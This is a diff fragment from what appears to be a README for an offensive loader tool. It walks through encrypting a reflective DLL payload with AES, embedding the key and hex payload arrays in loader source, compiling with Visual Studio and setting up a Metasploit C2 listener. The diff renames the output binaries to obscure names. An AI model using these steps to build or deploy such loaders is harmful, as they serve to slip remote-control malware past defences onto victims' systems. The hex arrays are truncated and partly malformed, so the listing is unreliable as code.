@@ -47,18 +47,18 @@ payload[] = { 0x34, 0x70, 0x35, 0x11, 0x1b, 0xd5, 0x0, 0x1e, 0x83, 0x49, 0x82, 0
 ```
 
 [3] Reemplace the hexadecimal payload and key into #reflectivedll/src/ReflectiveDll.c file (line:39,40), compile on Visual Studio.
-(OutputFile: reflectivedll\x64\Release\reflective_dll.x64.dll)
+(OutputFile: reflectivedll\x64\Release\cObO.x64.dll)
 
-[4] Encrypt the reflective_dll.x64.dll file with aes.py script:
+[4] Encrypt the cObO.x64.dll file with aes.py script:
 
 ```bash
-python3 aes.py reflective_dll.x64.dll
+python3 aes.py cObO.x64.dll
 OutPut:
 AESkey[] = { 0x1c, 0x51, 0x11, 0xa7, 0x93, 0xad, 0x69, 0x9a, 0xfd, 0x85, 0xe2, 0xd4, 0xbe, 0x28, 0xa0, 0x55 };
 payload[] = { 0x11, 0x50, 0x35, 0x45, 0x1b, 0xd5, 0x0, 0x1e, 0x83, 0x49, 0x82, x9a, 0xfd, 0x85, 0xe2, 0xd4, 0xbe, 0xf7, 0x93, 0xad, 0x69, 0x9a, ....., 0x19 };
 ```
 [5] Reemplace the hexadecimal payload and key into #reflectiveloader/src/main.cpp file (line:140,141), compile on Visual Studio.
-(OutputFile: reflectiveloader\x64\Debug\reflectiveLoader.exe)
+(OutputFile: reflectiveloader\x64\Debug\bOlO.exe)
 
 [6] Listener C2 Metasploit
 
